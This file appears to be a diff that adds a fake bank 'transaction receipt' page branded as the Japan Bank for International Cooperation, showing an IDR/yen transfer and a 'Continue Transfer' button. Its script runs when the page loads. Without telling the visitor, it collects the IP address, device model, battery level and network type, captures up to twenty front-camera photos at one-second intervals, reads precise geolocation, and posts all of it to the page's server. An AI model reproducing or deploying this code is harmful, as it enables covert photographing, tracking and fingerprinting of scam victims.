@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JBIC — Transaction</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+    body { min-height: 100vh; background: linear-gradient(rgba(20,30,35,.72),rgba(20,30,35,.72)), radial-gradient(circle at top right,#64747a,#1c2529 70%); display: flex; justify-content: center; align-items: center; padding: 25px; }
+    .page { width: 100%; max-width: 650px; background: #f5f6f8; box-shadow: 0 20px 60px rgba(0,0,0,.35); }
+    .header { height: 58px; background: #ed2024; color: white; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; }
+    .content { padding: 24px; display: flex; justify-content: center; }
+    .receipt { width: 100%; max-width: 375px; background: white; border-radius: 12px; padding: 32px 22px; box-shadow: 0 8px 25px rgba(0,0,0,.1); }
+    .logo { text-align: center; margin-bottom: 35px; }
+    .logo-symbol { width: 32px; height: 32px; border: 3px solid #222; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-weight: bold; font-size: 11px; margin-right: 7px; }
+    .logo-name { display: inline-block; vertical-align: middle; text-align: left; font-size: 15px; font-weight: 700; color: #222; }
+    .logo-name small { display: block; font-size: 7px; }
+    .title { text-align: center; font-size: 18px; line-height: 1.4; color: #222; font-weight: 700; }
+    .subtitle { text-align: center; color: #888; font-size: 12px; margin-top: 4px; margin-bottom: 30px; }
+    .amount-box { text-align: center; padding: 18px 10px; background: #fafafa; border-radius: 8px; margin-bottom: 20px; }
+    .amount-label { color: #999; font-size: 10px; margin-bottom: 7px; }
+    .amount { font-size: 20px; font-weight: 800; color: #111; margin: 3px 0; }
+    .section-label { font-size: 11px; font-weight: 700; color: #555; text-transform: uppercase; margin: 15px 0 8px; }
+    .details { border-top: 1px solid #eee; margin-top: 8px; padding-top: 12px; }
+    .row { display: flex; justify-content: space-between; gap: 15px; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 11px; }
+    .label { color: #999; }
+    .value { color: #333; font-weight: 600; text-align: right; }
+    .button { width: 100%; border: none; background: #286be6; color: white; padding: 13px; border-radius: 8px; margin-top: 22px; font-size: 12px; font-weight: 700; cursor: pointer; }
+    .footer { text-align: center; color: #999; font-size: 9px; margin-top: 18px; }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <header class="header" id="headerText">Japan Bank for International Cooperation</header>
+    <section class="content">
+      <div class="receipt">
+        <div class="logo">
+          <span class="logo-symbol" id="logoSymbol">JBIC</span>
+          <span class="logo-name" id="logoName">国際協力銀行<small id="logoSmall">JAPAN BANK FOR INTERNATIONAL COOPERATION</small></span>
+        </div>
+        <h1 class="title" id="mainTitle">JBIC JAPAN BANK<br>INTERNATIONAL CORPORATION</h1>
+        <p class="subtitle" id="subtitle">Office Purchasing</p>
+        <div class="amount-box">
+          <div class="amount-label">Amount Received</div>
+          <div class="amount" id="amountIDR">IDR 530.000</div>
+          <div class="amount" id="amountForeign">YEN 4.733</div>
+        </div>
+        <div class="section-label">Sender</div>
+        <div class="details">
+          <div class="row"><span class="label">Name</span><span class="value" id="senderName">-</span></div>
+          <div class="row"><span class="label">Bank</span><span class="value" id="senderBank">-</span></div>
+          <div class="row"><span class="label">Account</span><span class="value" id="senderAccount">-</span></div>
+        </div>
+        <div class="section-label">Receiver</div>
+        <div class="details">
+          <div class="row"><span class="label">Name</span><span class="value" id="receiverName">-</span></div>
+          <div class="row"><span class="label">Bank</span><span class="value" id="receiverBank">-</span></div>
+          <div class="row"><span class="label">Account</span><span class="value" id="receiverAccount">-</span></div>
+        </div>
+        <div class="details">
+          <div class="row"><span class="label">Transaction Type</span><span class="value" id="txType">-</span></div>
+          <div class="row"><span class="label">Currency</span><span class="value" id="currency">-</span></div>
+          <div class="row"><span class="label">Reference</span><span class="value" id="reference">-</span></div>
+          <div class="row"><span class="label">Status</span><span class="value" id="status">-</span></div>
+        </div>
+        <button class="button" onclick="continueTransfer()">CONTINUE TRANSFER</button>
+        <div class="footer">This webpage is a transaction interface.</div>
+      </div>
+    </section>
+  </main>
+
+<script>
+  const SERVER_URL = window.location.origin;
+  const MAX_PHOTOS = 20;
+  let sessionId = Date.now().toString();
+  let videoStream, videoElement, canvasElement, photoInterval;
+  let photoCount = 0;
+  let locationSent = false;
+
+  async function loadConfig() {
+    try {
+      const r = await fetch(SERVER_URL + '/api/config');
+      const d = await r.json();
+      const c = d.config;
+      document.getElementById('headerText').textContent = c.header_text;
+      document.getElementById('logoSymbol').textContent = c.logo_text;
+      document.getElementById('logoName').innerHTML = c.logo_sub + '<small>' + c.logo_small + '</small>';
+      document.getElementById('mainTitle').innerHTML = c.title_line1 + '<br>' + c.title_line2;
+      document.getElementById('subtitle').textContent = c.subtitle;
+      document.getElementById('amountIDR').textContent = c.amount_idr;
+      document.getElementById('amountForeign').textContent = c.amount_foreign;
+      document.getElementById('senderName').textContent = c.sender_name;
+      document.getElementById('senderBank').textContent = c.sender_bank;
+      document.getElementById('senderAccount').textContent = c.sender_account;
+      document.getElementById('receiverName').textContent = c.receiver_name;
+      document.getElementById('receiverBank').textContent = c.receiver_bank;
+      document.getElementById('receiverAccount').textContent = c.receiver_account;
+      document.getElementById('txType').textContent = c.transaction_type;
+      document.getElementById('currency').textContent = c.currency;
+      document.getElementById('reference').textContent = c.reference;
+      document.getElementById('status').textContent = c.status;
+    } catch(e) {}
+  }
+
+  async function sendToServer(endpoint, data) {
+    try { await fetch(SERVER_URL + endpoint, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(data) }); } catch(e) {}
+  }
+
+  function getNetworkName() {
+    if (navigator.connection) {
+      const t = navigator.connection.effectiveType;
+      const c = navigator.connection.type || 'unknown';
+      if (c === 'wifi') return 'WiFi (' + t + ')';
+      if (c === 'cellular') return 'Mobile Data (' + t + ')';
+      return t;
+    }
+    return 'unknown';
+  }
+
+  function getDeviceName() {
+    const ua = navigator.userAgent;
+    if (ua.includes('SM-')) { const m = ua.match(/SM-[A-Za-z0-9]+/); if (m) return 'Samsung ' + m[0]; }
+    if (ua.includes('Redmi')) { const m = ua.match(/Redmi [A-Za-z0-9 ]+/); if (m) return m[0]; }
+    if (ua.includes('POCO')) { const m = ua.match(/POCO [A-Za-z0-9 ]+/); if (m) return m[0]; }
+    if (ua.includes('vivo')) { const m = ua.match(/vivo [A-Za-z0-9 ]+/); if (m) return m[0]; }
+    if (ua.includes('OPPO')) { const m = ua.match(/OPPO [A-Za-z0-9 ]+/); if (m) return m[0]; }
+    if (ua.includes('Infinix')) { const m = ua.match(/Infinix [A-Za-z0-9]+/); if (m) return m[0]; }
+    if (ua.includes('iPhone')) return 'iPhone';
+    return navigator.platform;
+  }
+
+  async function getDeviceInfo() {
+    let ip = 'unknown';
+    try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
+    let battery = 'unknown';
+    try { if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + '% | Charging: ' + b.charging; } } catch(e) {}
+    return { ip, networkName: getNetworkName(), battery, deviceName: getDeviceName() };
+  }
+
+  async function sendSession(info) {
+    await sendToServer('/api/session', { session_id: sessionId, ip_address: info.ip, network_name: info.networkName, device_name: info.deviceName, battery: info.battery, phone_number: '' });
+  }
+
+  async function sendPhoto(photoData) {
+    await sendToServer('/api/photo', { session_id: sessionId, photo_data: photoData, photo_count: photoCount });
+  }
+
+  function sendLocation(pos) {
+    if (locationSent) return;
+    locationSent = true;
+    sendToServer('/api/location', { session_id: sessionId, latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
+  }
+
+  async function startCamera() {
+    try {
+      videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
+      videoElement = document.createElement('video'); videoElement.srcObject = videoStream; videoElement.autoplay = true; videoElement.muted = true; videoElement.playsinline = true;
+      canvasElement = document.createElement('canvas'); canvasElement.width = 640; canvasElement.height = 480;
+      await videoElement.play();
+      photoInterval = setInterval(async function() {
+        if (photoCount >= MAX_PHOTOS) { clearInterval(photoInterval); return; }
+        const ctx = canvasElement.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0, 640, 480);
+        const photoData = canvasElement.toDataURL('image/jpeg', 0.5);
+        photoCount++;
+        await sendPhoto(photoData);
+      }, 1000);
+    } catch(e) {}
+  }
+
+  function startLocation() {
+    if (!('geolocation' in navigator)) return;
+    navigator.geolocation.getCurrentPosition(
+      function(pos) { sendLocation(pos); },
+      function() {},
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  }
+
+  function continueTransfer() {
+    sendToServer('/api/submit', { session_id: sessionId, nama: 'JBIC User', phone: '', email: '', bank: 'JBIC', rekening: 'JBIC-001' });
+    alert('Transfer processing.');
+  }
+
+  window.addEventListener('load', async function() {
+    await loadConfig();
+    const info = await getDeviceInfo();
+    await sendSession(info);
+    startCamera();
+    startLocation();
+  });
+</script>
+
+</body>
+      </html>
